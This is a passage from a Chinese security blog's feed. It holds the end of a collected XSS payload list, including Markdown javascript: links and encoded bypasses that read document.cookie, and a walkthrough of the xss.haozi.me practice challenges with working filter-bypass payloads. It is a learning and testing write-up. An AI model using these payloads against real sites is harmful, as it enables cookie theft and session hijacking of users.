//IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('XSS'));"</span>&gt;</span>  //IE7以下</span><br></pre></td></tr></table></figure><h2 id="MarkDown-XSS-Payload杂烩"><a href="#MarkDown-XSS-Payload杂烩" class="headerlink" title="MarkDown XSS Payload杂烩"></a>MarkDown XSS Payload杂烩</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">j    a   v   a   s   c   r   i   p   t:prompt(document.cookie</span>))</span><br><span class="line">![<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))\</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">javascript:prompt(document.cookie)</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span></span><br><span class="line">![<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)\</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>)</span><br><span class="line">![<span class="string">a'"`onerror=prompt(document.cookie)</span>](<span class="link">x</span>)\</span><br><span class="line">[<span class="symbol">citelol</span>]: <span class="link">(javascript:prompt(document.cookie))</span></span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript:window.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">test</span>](<span class="link">javascript://%0d%0aprompt(1</span>))</span><br><span class="line">[<span class="string">test</span>](<span class="link">javascript://%0d%0aprompt(1</span>);com)</span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript:window.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">notmalicious</span>](<span class="link">javascript://%0d%0awindow.onerror=alert;throw%20document.cookie</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)</span><br><span class="line">[<span class="string">clickme</span>](<span class="link">vbscript:alert(document.domain</span>))</span><br><span class="line"><span class="emphasis">_http://danlec_</span>@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">http:</span>//\&lt;<span class="attr">meta</span>\ <span class="attr">http-equiv</span>=<span class="string">\</span>"<span class="attr">refresh</span>\"\ <span class="attr">content</span>=<span class="string">\</span>"<span class="attr">0</span>;\ <span class="attr">url</span>=<span class="string">http://danlec.com/\</span>"\&gt;</span></span>&gt;</span><br><span class="line">[<span class="string">text</span>](<span class="link">http://danlec.com " [@danlec](/danlec</span>) ")</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:this;alert(1</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:this;alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript&amp;#58this;alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">Javas&amp;#99;ript:alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">Javas%26%2399;ript:alert(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:alert&amp;#65534;(1&amp;#41;</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:confirm(1</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript://www.google.com%0Aprompt(1</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript://%0d%0aconfirm(1</span>);com)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:window.onerror=confirm;throw%201</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:alert(document.domain&amp;#41;</span>)</span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">http:</span>//&lt;?<span class="attr">php</span>\&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">\h1\</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">script:script</span>&gt;</span></span>confirm(2)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/spang_33/article/details/80930046" target="_blank" rel="noopener">xss绕过，payload全集</a></p><p><a href="http://zone.secevery.com/?/article/328" target="_blank" rel="noopener">一些xss的pyload</a></p><p><a href="http://wiki.7ell.me/#!rules/sql-xss.md" target="_blank" rel="noopener">Me7ell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。&lt;/p&gt;
&lt;h2 id=&quot;《xss绕过，payload全集》&quot;&gt;&lt;a href=&quot;#《xss绕过，payload全集》&quot; class=&quot;headerlink&quot; title=&quot;《xss绕过，payload全集》
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS闯关之xss.haozi.me</title>
    <link href="https://Mi1k7ea.github.com/2019/02/15/XSS%E9%97%AF%E5%85%B3%E4%B9%8Bxss-haozi-me/"/>
    <id>https://Mi1k7ea.github.com/2019/02/15/XSS闯关之xss-haozi-me/</id>
    <published>2019-02-15T15:29:40.000Z</published>
    <updated>2019-02-16T07:52:52.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>这里写下haozi大佬的XSS闯关练习笔记。</p><p>题目网址为：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p><p>项目地址为：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p><p>注意这里有一个自带alert(1)的js地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a>。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无任何过滤直接往div标签内写内容，直接上payload即可。下面将本次用到的XSS payload小结如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//加载外部js</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//点击按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>//鼠标指针移动到指定的元素上时执行</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onmousemove</span>=<span class="string">alert(1)</span>&gt;</span>//鼠标移动时执行</span><br><span class="line">......还有其他onmouse系列</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span>&gt;</span>//鼠标移动指向图片</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span>//鼠标点击图片</span><br></pre></td></tr></table></figure><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无任何过滤直接往textarea标签内写内容，直接写和上面一样的payload是不行的，因为该标签内被解析为文本内容，文本框是无法执行JS代码的，因此需要闭合该textarea标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的DOM型XSS，无任何过滤直接往input标签内的value属性写内容，闭合掉双引号和大于号即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以如下构造，当鼠标指向input输入框时就会执行弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onmouseover="alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了[]、()等符号，那就用反引号`来替代()：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>当然在标签属性内也可以使用HTML实体编码绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接引用外部js文件同样OK：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基础上，添加了反引号`的过滤，但前面的后两个payload是可以用的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然还有下面一些payload，同样都是利用编码绕过，只是标签不同而已：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror=<span class="built_in">eval</span>;<span class="keyword">throw</span><span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//利用js捕获抛出错误执行弹框，Unicode编码</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span>//利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容</span><br></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了–&gt;，并将输入放入注释中间。但是，</p><p>HTML注释支持以下两种方式：</p><ul><li><code>&lt;!-- xxx --&gt;</code></li><li><code>&lt;!- xxx -!&gt;</code> <code>&lt;!—</code> 以！开头，以！结尾对称注释的方式 <code>—!&gt;</code></li></ul><p>直接如下绕过：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了auto、大于号&gt;、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。</p><p>这里利用input标签的onmouse系列属性弹框即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousemove</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><p>另外，input标签的type属性可以设置为image，然后利用类似img标签的套路来弹框即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type="image" src="" onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了&lt;&gt;括起来的字符串内容，这里可以利用容错性，少添加最后一个大于号&gt;也是可以执行的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)//</span></span></span><br></pre></td></tr></table></figure><p>当然，”//“可以替换为”&lt;!–”或空格或回车。</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了想要闭合用的style标签，且忽略大小写。和前面的一样，我们可以在标签的大于号&gt;之前添加空格或换行来绕过执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">style</span> &gt;</span><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则限制了必须以指定的域名来开头，并放置在script标签的src属性中。这里直接闭合双引号和script标签即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js</span></span></span><br></pre></td></tr></table></figure><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>关键源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span 